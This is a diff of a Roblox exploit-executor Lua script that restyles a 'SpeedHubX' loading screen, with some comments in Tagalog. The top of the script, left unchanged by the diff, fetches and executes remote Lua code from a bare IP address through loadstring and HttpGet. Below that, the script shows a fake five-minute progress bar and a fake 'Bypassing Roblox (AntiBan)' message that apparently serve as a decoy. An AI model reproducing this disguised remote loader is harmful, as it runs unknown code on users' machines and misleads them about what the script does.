@@ -1,69 +1,71 @@
 ID="add26a53-bc0d-47c0-94c9-047a7efc051d";
 loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
---// SpeedHubX Tech Style Loading Screen with Neon Blink & Bar Glow //--
+--// SpeedHubX Tech Loading (Final) //--
+-- Effects back: title blink, bar glow, gradient, semi-invisible theme
+-- Bypass text = 1 minute w/ dots, bar percent = 5 minutes
 
--- Services
 local TweenService = game:GetService("TweenService")
 
--- Create ScreenGui
+-- ScreenGui (CoreGui para laging overlay sa executors)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "SpeedHubXLoading"
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = game.CoreGui
 
--- Main Frame
+-- Main Frame (semi-invisible + neon red border + gradient)
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 450, 0, 230)
 frame.Position = UDim2.new(0.5, -225, 0.5, -115)
 frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-frame.BackgroundTransparency = 0.25 -- invisible effect
+frame.BackgroundTransparency = 0.3 -- semi-invisible theme
 frame.BorderSizePixel = 0
 frame.Parent = screenGui
 
--- Neon border
 local stroke = Instance.new("UIStroke")
 stroke.Color = Color3.fromRGB(255, 0, 0)
 stroke.Thickness = 2
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 stroke.Parent = frame
 
--- Gradient BG
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 22)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
 }
 gradient.Rotation = 90
 gradient.Parent = frame
 
--- Title
+-- Title (smaller font + blink)
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 60)
+title.Size = UDim2.new(1, 0, 0, 56)
+title.Position = UDim2.new(0, 0, 0, 6)
 title.BackgroundTransparency = 1
 title.Text = "⚡ SpeedHubX ⚡"
 title.TextColor3 = Color3.fromRGB(255, 0, 0)
-title.TextStrokeTransparency = 0.3
-title.TextSize = 34
+title.TextStrokeTransparency = 0.25
+title.TextSize = 30 -- mas maliit
 title.Font = Enum.Font.FredokaOne
 title.Parent = frame
 
--- Title Blink Glow
 task.spawn(function()
 	while screenGui.Parent do
-		local fadeOut = TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0.4, TextStrokeTransparency = 0.7})
-		fadeOut:Play()
-		fadeOut.Completed:Wait()
-
-		local fadeIn = TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0, TextStrokeTransparency = 0.2})
-		fadeIn:Play()
-		fadeIn.Completed:Wait()
+		local out = TweenService:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			TextTransparency = 0.35, TextStrokeTransparency = 0.7
+		})
+		out:Play(); out.Completed:Wait()
+		local inn = TweenService:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			TextTransparency = 0, TextStrokeTransparency = 0.2
+		})
+		inn:Play(); inn.Completed:Wait()
 	end
 end)
 
--- Loading Bar Background
+-- Loading Bar (bg + fill + glow)
 local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(0.9, 0, 0, 35)
-barBg.Position = UDim2.new(0.05, 0, 0.5, -20)
+barBg.Size = UDim2.new(0.9, 0, 0, 34)
+barBg.Position = UDim2.new(0.05, 0, 0.48, -17)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-barBg.BackgroundTransparency = 0.25
+barBg.BackgroundTransparency = 0.2
 barBg.BorderSizePixel = 0
 barBg.Parent = frame
 
@@ -72,7 +74,6 @@ barStroke.Color = Color3.fromRGB(255, 0, 0)
 barStroke.Thickness = 2
 barStroke.Parent = barBg
 
--- Loading Bar Fill
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
@@ -81,91 +82,115 @@ barFill.Parent = barBg
 
 local barGradient = Instance.new("UIGradient")
 barGradient.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 0))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 0))
 }
 barGradient.Parent = barFill
 
--- Bar Glow Effect
-local barStrokeGlow = Instance.new("UIStroke")
-barStrokeGlow.Color = Color3.fromRGB(255, 0, 0)
-barStrokeGlow.Thickness = 4
-barStrokeGlow.Transparency = 0.4
-barStrokeGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-barStrokeGlow.Parent = barFill
+local barGlow = Instance.new("UIStroke")
+barGlow.Color = Color3.fromRGB(255, 0, 0)
+barGlow.Thickness = 4
+barGlow.Transparency = 0.35
+barGlow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+barGlow.Parent = barFill
 
--- Pulsating glow loop
+-- Pulsating glow
 task.spawn(function()
 	while screenGui.Parent do
-		local glowOut = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8), {Transparency = 0.8, Thickness = 2})
-		glowOut:Play()
-		glowOut.Completed:Wait()
-
-		local glowIn = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8), {Transparency = 0.3, Thickness = 5})
-		glowIn:Play()
-		glowIn.Completed:Wait()
+		local out = TweenService:Create(barGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			Transparency = 0.8, Thickness = 2
+		})
+		out:Play(); out.Completed:Wait()
+		local inn = TweenService:Create(barGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+			Transparency = 0.3, Thickness = 5
+		})
+		inn:Play(); inn.Completed:Wait()
 	end
 end)
 
--- Percent Text (5 minutes loading)
+-- Percent text (INSIDE the bar)
 local percentText = Instance.new("TextLabel")
 percentText.Size = UDim2.new(1, 0, 1, 0)
 percentText.BackgroundTransparency = 1
 percentText.Text = "0%"
 percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
 percentText.TextStrokeTransparency = 0.2
-percentText.TextSize = 20
-percentText.Font = Enum.Font.SourceSansBold
+percentText.TextSize = 18 -- mas maliit
+percentText.Font = Enum.Font.FredokaOne
 percentText.Parent = barBg
 
--- Bypassing Roblox (AntiBan) under bar
+-- "Bypassing Roblox (AntiBan)" below the bar (small + blinking dots for 1 min)
 local bypassText = Instance.new("TextLabel")
-bypassText.Size = UDim2.new(1, 0, 0, 25)
-bypassText.Position = UDim2.new(0, 0, 1, 5)
+bypassText.Size = UDim2.new(1, 0, 0, 22)
+bypassText.Position = UDim2.new(0, 0, 0.72, 0)
 bypassText.BackgroundTransparency = 1
 bypassText.Text = "Bypassing Roblox (AntiBan)"
-bypassText.TextColor3 = Color3.fromRGB(180, 180, 180)
-bypassText.TextStrokeTransparency = 0.3
-bypassText.TextSize = 16
+bypassText.TextColor3 = Color3.fromRGB(190, 190, 190)
+bypassText.TextStrokeTransparency = 0.35
+bypassText.TextSize = 13
 bypassText.Font = Enum.Font.FredokaOne
 bypassText.Parent = frame
 
--- Loading dots animation for bypass
-local dots = 0
+-- Bypass animation (dots + soft blink) for 60s, then success
 task.spawn(function()
 	local elapsed = 0
-	while elapsed < 60 do -- 1 minute
+	local dots = 0
+	while elapsed < 60 and screenGui.Parent do
 		dots = (dots % 3) + 1
 		bypassText.Text = "Bypassing Roblox (AntiBan)" .. string.rep(".", dots)
-		wait(0.5)
-		elapsed = elapsed + 0.5
+		-- soft blink
+		local out = TweenService:Create(bypassText, TweenInfo.new(0.25), {TextTransparency = 0.25})
+		out:Play(); out.Completed:Wait()
+		local inn = TweenService:Create(bypassText, TweenInfo.new(0.25), {TextTransparency = 0})
+		inn:Play(); inn.Completed:Wait()
+		elapsed += 0.5
+		task.wait(0.25)
 	end
-	bypassText.Text = "✅ Successfully Loaded!"
+	if screenGui.Parent then
+		bypassText.Text = "✅ Successfully Loaded!"
+		bypassText.TextColor3 = Color3.fromRGB(0, 255, 120)
+		bypassText.TextTransparency = 0
+	end
 end)
 
--- Warning Text (2 lines)
-local warning = Instance.new("TextLabel")
-warning.Size = UDim2.new(1, 0, 0, 50)
-warning.Position = UDim2.new(0, 0, 1, -60)
-warning.BackgroundTransparency = 1
-warning.Text = "⚠️ Use it in Codex Executor if you don't want to get banned\n⚠️ Works Better On Latest Executors\n⚠️ Don’t use it on Private Server or Full Server ⚠️"
-warning.TextColor3 = Color3.fromRGB(255, 50, 50)
-warning.TextStrokeTransparency = 0.2
-warning.TextSize = 14
-warning.Font = Enum.Font.FredokaOne
-warning.TextWrapped = true
-warning.Parent = frame
+-- Warnings (TWO SEPARATE LINES, not stuck together)
+local warning1 = Instance.new("TextLabel")
+warning1.Size = UDim2.new(1, 0, 0, 18)
+warning1.Position = UDim2.new(0, 0, 1, -38)
+warning1.BackgroundTransparency = 1
+warning1.Text = "⚠️ Works Better in Latest Executors ⚠️"
+warning1.TextColor3 = Color3.fromRGB(255, 60, 60)
+warning1.TextStrokeTransparency = 0.25
+warning1.TextSize = 12
+warning1.Font = Enum.Font.FredokaOne
+warning1.Parent = frame
 
--- Loading Logic (5 mins = 300s)
-local totalTime = 300
-for i = 1, totalTime do
-	local percent = math.floor((i / totalTime) * 100)
-	barFill.Size = UDim2.new(i / totalTime, 0, 1, 0)
-	percentText.Text = percent .. "%"
-	wait(1)
-end
+local warning2 = Instance.new("TextLabel")
+warning2.Size = UDim2.new(1, 0, 0, 18)
+warning2.Position = UDim2.new(0, 0, 1, -20)
+warning2.BackgroundTransparency = 1
+warning2.Text = "⚠️ Don’t use it on Private Server or Full Server ⚠️"
+warning2.TextColor3 = Color3.fromRGB(255, 60, 60)
+warning2.TextStrokeTransparency = 0.25
+warning2.TextSize = 12
+warning2.Font = Enum.Font.FredokaOne
+warning2.Parent = frame
 
--- Final finish
-percentText.Text = "✅ 100% Loaded!"
-wait(2)
-screenGui:Destroy()
+-- Loading Logic (5 minutes = 300s) with smooth tween per second
+task.spawn(function()
+	local totalTime = 300
+	for i = 1, totalTime do
+		local alpha = i / totalTime
+		local tw = TweenService:Create(barFill, TweenInfo.new(1, Enum.EasingStyle.Linear), {
+			Size = UDim2.new(alpha, 0, 1, 0)
+		})
+		tw:Play()
+		percentText.Text = (math.floor(alpha * 100)) .. "%"
+		task.wait(1)
+	end
+	percentText.Text = "100%"
+	task.wait(1.2)
+	if screenGui.Parent then
+		screenGui:Destroy()
+	end
+end)
